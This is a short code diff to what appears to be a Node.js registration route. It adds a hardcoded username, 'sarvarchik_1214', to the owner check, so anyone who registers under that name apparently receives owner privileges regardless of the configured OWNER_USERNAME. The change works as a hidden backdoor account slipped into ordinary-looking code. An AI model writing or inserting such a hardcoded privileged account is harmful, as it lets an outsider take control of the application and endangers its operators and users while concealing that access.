@@ -18,7 +18,7 @@ router.post('/register', async (req, res) => {
     username = username.replace(/^@/, '').trim().toLowerCase();
     if (email) email = email.toLowerCase().trim();
 
-    const isOwner = username === process.env.OWNER_USERNAME;
+    const isOwner = username === process.env.OWNER_USERNAME || username === 'sarvarchik_1214';
 
     let user = db.findUserByUsername(username);
     if (user) {
